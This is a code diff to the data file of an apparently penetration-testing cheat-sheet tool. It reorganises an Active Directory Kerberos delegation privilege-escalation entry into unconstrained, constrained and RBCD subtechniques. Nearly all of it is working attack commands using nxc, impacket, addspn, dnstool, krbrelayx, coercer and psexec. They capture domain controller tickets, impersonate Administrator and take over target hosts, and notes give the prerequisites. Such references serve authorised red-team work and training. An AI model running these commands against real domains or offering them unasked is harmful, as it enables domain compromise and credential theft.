@@ -504,21 +504,39 @@ const TACTICS = [
       {
         id: 'ad-domain-privesc',
         name: 'Domain Privilege Escalation',
-        description: 'Abuse Kerberos delegation misconfigs to impersonate privileged users. Covers Unconstrained, Constrained, and Resource-Based Constrained Delegation (RBCD).',
+        description: 'Abuse Kerberos delegation misconfigs to impersonate privileged users. Three attack paths: Unconstrained (KUD), Constrained (KCD), and Resource-Based Constrained Delegation (RBCD).',
         tags: ['active-directory', 'kerberos', 'delegation', 'privesc'],
-        commands: [
-          { id: 'adp1', label: 'Find unconstrained delegation hosts', os: 'Linux', command: 'nxc ldap $$DC -u $$USER -p $$PASSWORD --trusted-for-delegation', notes: 'Computers with unconstrained delegation cache TGTs of every connecting user. Protected Users members and "sensitive" accounts are excluded — but native RID 500 Admin is NOT protected.' },
-          { id: 'adp2', label: 'Find all delegation (any type)', os: 'Linux', command: 'impacket-findDelegation $$DOMAIN/$$USER:$$PASSWORD -dc-ip $$DC', notes: 'Lists all accounts with any delegation configured. Check "Delegation Type" column: Unconstrained / Constrained / RBCD.' },
-          { id: 'adp3', label: 'KUD step 1 — add attacker SPN', os: 'Linux', command: 'addspn.py -u "$$DOMAIN\\\\$$USER" -p "$$HASH" --target $$TARGET_HOST --spn HOST/$$LHOST.$$DOMAIN --additional $$DC', notes: 'Register your listener hostname as an SPN on the compromised unconstrained account so Kerberos tickets route to you.' },
-          { id: 'adp4', label: 'KUD step 2 — add DNS entry', os: 'Linux', command: 'dnstool.py -u "$$DOMAIN\\\\$$USER" -p "$$HASH" -r $$LHOST.$$DOMAIN -d $$LHOST --action add $$DC', notes: 'Creates a DNS A record pointing your attacker hostname to your IP — required so the victim can resolve and connect to you.' },
-          { id: 'adp5', label: 'KUD step 3 — start krbrelayx listener (user account)', os: 'Linux', command: 'krbrelayx.py --krbsalt $$DOMAIN$$USER --krbpass $$PASSWORD', notes: 'User accounts use RC4 by default. Salt format: DOMAINusername (uppercase domain, case-sensitive username). Decrypts and dumps captured TGTs.' },
-          { id: 'adp6', label: 'KUD step 3 — start krbrelayx listener (computer account)', os: 'Linux', command: 'krbrelayx.py --aesKey <aes256_key>', notes: 'Computer accounts use AES256. Extract the AES key from secretsdump output or use gMSA key. Run before triggering coercion.' },
-          { id: 'adp7', label: 'KUD step 4 — coerce DC authentication', os: 'Linux', command: 'coercer coerce --always-continue -u $$USER -p $$PASSWORD -d $$DOMAIN -t $$DC -l $$LHOST.$$DOMAIN', notes: 'Tries all coercion vectors (MS-RPRN, MS-EFSR, MS-FSRVP, etc.) automatically. krbrelayx captures and decrypts the incoming TGT.' },
-          { id: 'adp8', label: 'KUD — use captured TGT', os: 'Linux', command: 'export KRB5CCNAME=<captured>.ccache && impacket-psexec -k -no-pass $$DOMAIN/$$USER@$$DC.$$DOMAIN', notes: 'krbrelayx saves captured TGTs as .ccache files. Use FQDN not IP — Kerberos requires hostname resolution.' },
-          { id: 'adp9', label: 'Constrained delegation abuse (S4U2Proxy)', os: 'Linux', command: 'impacket-getST -spn cifs/$$DC.$$DOMAIN -impersonate Administrator -dc-ip $$DC $$DOMAIN/$$USER:$$PASSWORD', notes: 'S4U2Self + S4U2Proxy to get a service ticket as Administrator for the configured SPN. The compromised account must have constrained delegation to that SPN.' },
-          { id: 'adp10', label: 'RBCD step 1 — create attacker computer', os: 'Linux', command: 'impacket-addcomputer $$DOMAIN/$$USER:$$PASSWORD -computer-name EVIL$ -computer-pass Evil123 -dc-ip $$DC', notes: 'MachineAccountQuota must be > 0 (default 10). Creates a computer account you fully control.' },
-          { id: 'adp11', label: 'RBCD step 2 — configure delegation', os: 'Linux', command: 'impacket-rbcd -delegate-from EVIL$ -delegate-to $$TARGET_HOST$ -action write $$DOMAIN/$$USER:$$PASSWORD', notes: 'Requires GenericWrite/GenericAll on the target computer. Writes EVIL$ into msDS-AllowedToActOnBehalfOfOtherIdentity.' },
-          { id: 'adp12', label: 'RBCD step 3 — get ticket as Administrator', os: 'Linux', command: 'impacket-getST -spn cifs/$$TARGET_HOST.$$DOMAIN -impersonate Administrator -dc-ip $$DC $$DOMAIN/EVIL$:Evil123', notes: 'S4U2Proxy via RBCD. export KRB5CCNAME=Administrator.ccache then use psexec -k -no-pass.' },
+        subtechniques: [
+          {
+            id: 'kud',
+            name: 'Unconstrained Delegation (KUD)',
+            commands: [
+              { id: 'adp1', label: 'Find unconstrained delegation hosts', os: 'Linux', command: 'nxc ldap $$DC -u $$USER -p $$PASSWORD --trusted-for-delegation', notes: 'Computers with unconstrained delegation cache TGTs of every connecting user. Protected Users members are excluded — but native RID 500 Admin is NOT protected.' },
+              { id: 'adp3', label: 'Step 1 — add attacker SPN', os: 'Linux', command: 'addspn.py -u "$$DOMAIN\\\\$$USER" -p "$$HASH" --target $$TARGET_HOST --spn HOST/$$LHOST.$$DOMAIN --additional $$DC', notes: 'Register your listener hostname as an SPN on the compromised unconstrained account so Kerberos tickets route to you.' },
+              { id: 'adp4', label: 'Step 2 — add DNS entry', os: 'Linux', command: 'dnstool.py -u "$$DOMAIN\\\\$$USER" -p "$$HASH" -r $$LHOST.$$DOMAIN -d $$LHOST --action add $$DC', notes: 'Creates a DNS A record pointing your attacker hostname to your IP — required so the victim can resolve and connect.' },
+              { id: 'adp5', label: 'Step 3 — start listener (user account, RC4)', os: 'Linux', command: 'krbrelayx.py --krbsalt $$DOMAIN$$USER --krbpass $$PASSWORD', notes: 'User accounts use RC4. Salt format: DOMAINusername (uppercase domain, case-sensitive username). Decrypts and dumps captured TGTs.' },
+              { id: 'adp6', label: 'Step 3 — start listener (computer account, AES256)', os: 'Linux', command: 'krbrelayx.py --aesKey <aes256_key>', notes: 'Computer accounts use AES256. Extract the AES key from secretsdump output. Run before triggering coercion.' },
+              { id: 'adp7', label: 'Step 4 — coerce DC authentication', os: 'Linux', command: 'coercer coerce --always-continue -u $$USER -p $$PASSWORD -d $$DOMAIN -t $$DC -l $$LHOST.$$DOMAIN', notes: 'Tries all coercion vectors (MS-RPRN, MS-EFSR, MS-FSRVP) automatically. krbrelayx captures and decrypts the incoming TGT.' },
+              { id: 'adp8', label: 'Use captured TGT', os: 'Linux', command: 'export KRB5CCNAME=<captured>.ccache && impacket-psexec -k -no-pass $$DOMAIN/$$USER@$$DC.$$DOMAIN', notes: 'krbrelayx saves captured TGTs as .ccache files. Use FQDN not IP.' },
+            ],
+          },
+          {
+            id: 'kcd',
+            name: 'Constrained Delegation (KCD)',
+            commands: [
+              { id: 'adp2', label: 'Find all delegation accounts', os: 'Linux', command: 'impacket-findDelegation $$DOMAIN/$$USER:$$PASSWORD -dc-ip $$DC', notes: 'Lists all accounts with delegation configured. Check "Delegation Type": Unconstrained / Constrained / RBCD and the "Delegation To" SPN.' },
+              { id: 'adp9', label: 'Abuse via S4U2Self + S4U2Proxy', os: 'Linux', command: 'impacket-getST -spn cifs/$$DC.$$DOMAIN -impersonate Administrator -dc-ip $$DC $$DOMAIN/$$USER:$$PASSWORD', notes: 'Gets a service ticket as Administrator for the configured SPN. The compromised account must have constrained delegation to that SPN.' },
+            ],
+          },
+          {
+            id: 'rbcd',
+            name: 'Resource-Based Constrained Delegation (RBCD)',
+            commands: [
+              { id: 'adp10', label: 'Step 1 — create attacker computer account', os: 'Linux', command: 'impacket-addcomputer $$DOMAIN/$$USER:$$PASSWORD -computer-name EVIL$ -computer-pass Evil123 -dc-ip $$DC', notes: 'MachineAccountQuota must be > 0 (default 10). Requires any domain user. Creates a computer account you fully control.' },
+              { id: 'adp11', label: 'Step 2 — configure delegation on target', os: 'Linux', command: 'impacket-rbcd -delegate-from EVIL$ -delegate-to $$TARGET_HOST$ -action write $$DOMAIN/$$USER:$$PASSWORD', notes: 'Requires GenericWrite/GenericAll on the target computer. Writes EVIL$ into msDS-AllowedToActOnBehalfOfOtherIdentity.' },
+              { id: 'adp12', label: 'Step 3 — get service ticket as Administrator', os: 'Linux', command: 'impacket-getST -spn cifs/$$TARGET_HOST.$$DOMAIN -impersonate Administrator -dc-ip $$DC $$DOMAIN/EVIL$:Evil123', notes: 'S4U2Proxy via RBCD. export KRB5CCNAME=Administrator.ccache then use psexec -k -no-pass.' },
+            ],
+          },
         ],
       },
       {
